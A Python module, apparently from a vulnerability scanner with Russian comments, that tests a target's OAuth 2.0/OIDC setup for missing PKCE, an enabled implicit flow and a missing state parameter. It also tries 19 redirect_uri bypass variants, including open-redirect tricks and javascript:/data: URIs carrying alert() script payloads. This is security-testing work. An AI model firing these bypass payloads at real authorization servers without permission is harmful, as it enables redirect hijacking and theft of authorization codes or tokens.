"""oauth_misconfig v2 — OAuth 2.0 / OIDC misconfigurations with verify.

Атаки:
  1. redirect_uri bypass (15+ форм)
  2. Missing state parameter (CSRF в OAuth flow)
  3. Missing PKCE (code_challenge не требуется)
  4. Implicit flow (response_type=token) — токен утекает в fragment
  5. Open discovery (.well-known/openid-configuration)
  6. Fragment/query leak

Canary — уникальный per run.
Verify ×2 — Location должен повториться.
"""
import secrets
import json
from urllib.parse import urlparse, urlencode
from core.http import HttpClient
from core.verify import confidence, is_signal


OAUTH_PATHS = [
    "/oauth/authorize", "/oauth2/authorize", "/authorize",
    "/auth/oauth", "/oauth/authorize/", "/login/oauth/authorize",
    "/api/oauth/authorize", "/oauth2/auth", "/connect/authorize",
    "/oauth/v2/authorize", "/oauth2/v2/authorize",
    "/as/authorization.oauth2", "/idp/authorize",
]

DISCOVERY_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/.well-known/oauth-authorization-server/tenant",
]

# 15+ redirect_uri bypass forms — формат-функция
def _redirect_variants(canary):
    """Возвращает список (описание, redirect_uri)."""
    evil = f"https://{canary}"
    evil_host = canary
    return [
        ("full_replace",     evil),
        ("subdomain_suffix", f"https://{evil_host}.legit.example"),
        ("prefix_domain",    f"https://legit{evil_host}"),
        ("userinfo_trick",   f"https://legit.example@{canary}"),
        ("at_in_host",       f"https://legit.example%40{canary}"),
        ("path_traversal",   f"https://legit.example/../{canary}"),
        ("encoded_slash",    f"https://legit.example%2f.evil%3d{canary}"),
        ("query_trick",      f"https://legit.example?x={canary}"),
        ("fragment_trick",   f"https://legit.example#{canary}"),
        ("protocol_relative",f"//{canary}"),
        ("backslash",        f"https://legit.example\\@{canary}"),
        ("double_encoded",   f"https://legit.example%252f%252e%252e%252f{canary}"),
        ("javascript_uri",   "javascript:alert(document.domain)"),
        ("data_uri",         "data:text/html,<script>alert(1)</script>"),
        ("https_with_port",  f"https://legit.example:443@{canary}"),
        ("schema_trick",     f"https://legit.example.{canary}"),
        ("dot_at_end",       f"https://{canary}."),
        ("trailing_space",   f"https://{canary} "),
        ("null_in_host",     f"https://legit.example%00.{canary}"),
    ]


class OauthMisconfig:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)

        u = urlparse(target)
        base = f"{u.scheme}://{u.netloc}"

        canary_host = f"oauth-canary-{secrets.token_hex(4)}.example"
        canary_url = f"https://{canary_host}"

        print(f"[oauth v2] target: {base}")
        print(f"[oauth v2] canary: {canary_host}")

        findings = []

        # ============================================================
        # Phase 1: discovery — .well-known
        # ============================================================
        discovered = None
        for path in DISCOVERY_PATHS:
            try:
                r = http.get(base + path, allow_redirects=False)
            except Exception:
                continue
            if not r or r.status_code != 200:
                continue
            try:
                data = r.json()
            except Exception:
                continue
            if isinstance(data, dict) and (
                "authorization_endpoint" in data or "issuer" in data
            ):
                discovered = data
                print(f"[oauth v2] OIDC discovery: {path}")
                print(f"  issuer: {data.get('issuer')}")
                print(f"  authorization_endpoint: {data.get('authorization_endpoint')}")
                print(f"  token_endpoint: {data.get('token_endpoint')}")
                print(f"  response_types_supported: {data.get('response_types_supported', [])}")
                print(f"  code_challenge_methods_supported: {data.get('code_challenge_methods_supported', 'none')}")

                logger.finding("oauth_discovery", "info", path)

                # PKCE check
                methods = data.get("code_challenge_methods_supported", [])
                if not methods:
                    conf = confidence(0.6, 1.0)
                    if is_signal(conf, floor=0.55, module="oauth"):
                        findings.append({
                            "type": "oauth_no_pkce",
                            "severity": "medium",
                            "note": "server does not advertise code_challenge_methods",
                            "confidence": conf,
                        })
                        print(f"  no PKCE advertised")
                        logger.finding("oauth_no_pkce", "medium", path)

                # implicit flow enabled?
                rts = data.get("response_types_supported", [])
                if any("token" in rt for rt in rts):
                    conf = confidence(0.5, 1.0)
                    if is_signal(conf, floor=0.55, module="oauth"):
                        findings.append({
                            "type": "oauth_implicit_enabled",
                            "severity": "low",
                            "response_types": rts,
                            "confidence": conf,
                        })
                        print(f"  implicit flow enabled: {rts}")
                        logger.finding("oauth_implicit", "low", str(rts))
                break

        # ============================================================
        # Phase 2: найти authorize endpoint
        # ============================================================
        auth_endpoint = None
        if discovered and discovered.get("authorization_endpoint"):
            auth_endpoint = discovered["authorization_endpoint"]
            print(f"[oauth v2] using discovered auth endpoint")
        else:
            for path in OAUTH_PATHS:
                try:
                    r = http.get(base + path, allow_redirects=False)
                except Exception:
                    continue
                if r and r.status_code in (200, 302, 400, 401):
                    # 400/401 с жалобой на missing params — endpoint живой
                    body = (r.text or "")[:500].lower()
                    if r.status_code in (400, 401) and ("client_id" in body or "redirect_uri" in body or "response_type" in body):
                        auth_endpoint = base + path
                        print(f"[oauth v2] auth endpoint (400/401): {path}")
                        break
                    elif r.status_code in (302,) and "location" in {k.lower() for k in r.headers}:
                        auth_endpoint = base + path
                        print(f"[oauth v2] auth endpoint (302): {path}")
                        break

        if not auth_endpoint:
            print(f"[oauth v2] no OAuth authorize endpoint — skip redirect testing")

        # ============================================================
        # Phase 3: redirect_uri bypass
        # ============================================================
        if auth_endpoint:
            print()
            print(f"[oauth v2] testing redirect_uri bypass ({len(_redirect_variants(canary_host))} variants)")

            for desc, redirect_uri in _redirect_variants(canary_host):
                # пробуем 4 имени параметра
                for param in ("redirect_uri", "redirect_url", "callback", "return_uri"):
                    query = urlencode({
                        param: redirect_uri,
                        "client_id": "test",
                        "response_type": "code",
                        "scope": "openid",
                        "state": "test_state_12345",
                    })
                    url = f"{auth_endpoint}?{query}"
                    try:
                        r = http.get(url, allow_redirects=False)
                    except Exception:
                        continue
                    if not r:
                        continue
                    loc = r.headers.get("Location", "")

                    # check: redirect на canary
                    if canary_host in loc:
                        # verify ×2
                        try:
                            r2 = http.get(url, allow_redirects=False)
                            loc2 = r2.headers.get("Location", "") if r2 else ""
                        except Exception:
                            loc2 = ""

                        if canary_host in loc2:
                            conf = confidence(0.95, 1.0)
                            if is_signal(conf, floor=0.55, module="oauth"):
                                findings.append({
                                    "type": "redirect_uri_bypass",
                                    "severity": "critical",
                                    "endpoint": auth_endpoint,
                                    "param": param,
                                    "variant": desc,
                                    "redirect_uri": redirect_uri[:120],
                                    "location": loc[:200],
                                    "verified": True,
                                    "confidence": conf,
                                })
                                print(f"  ✓ redirect bypass ({desc}): {param}={redirect_uri[:60]}")
                                logger.finding("oauth_redirect_bypass", "critical",
                                               f"{desc} {param}")
                                break
                if any(f.get("type") == "redirect_uri_bypass" for f in findings):
                    break

            # ============================================================
            # Phase 4: missing state parameter
            # ============================================================
            print()
            print(f"[oauth v2] testing missing state parameter")
            query_no_state = urlencode({
                "client_id": "test",
                "redirect_uri": canary_url,
                "response_type": "code",
            })
            url = f"{auth_endpoint}?{query_no_state}"
            try:
                r = http.get(url, allow_redirects=False)
                if r and r.status_code in (200, 302):
                    loc = r.headers.get("Location", "")
                    # если сервер не жалуется и редиректит — state не требуется
                    if r.status_code == 302 and "error" not in loc.lower():
                        conf = confidence(0.65, 1.0)
                        if is_signal(conf, floor=0.55, module="oauth"):
                            findings.append({
                                "type": "oauth_missing_state",
                                "severity": "medium",
                                "endpoint": auth_endpoint,
                                "confidence": conf,
                            })
                            print(f"  ✓ state параметр не требуется")
                            logger.finding("oauth_no_state", "medium", auth_endpoint)
            except Exception:
                pass

        # ============================================================
        # Итог
        # ============================================================
        print()
        print(f"[oauth v2] findings: {len(findings)}")
        return {
            "findings": findings,
            "discovery": bool(discovered),
            "auth_endpoint": auth_endpoint,
            "canary": canary_host,
        }
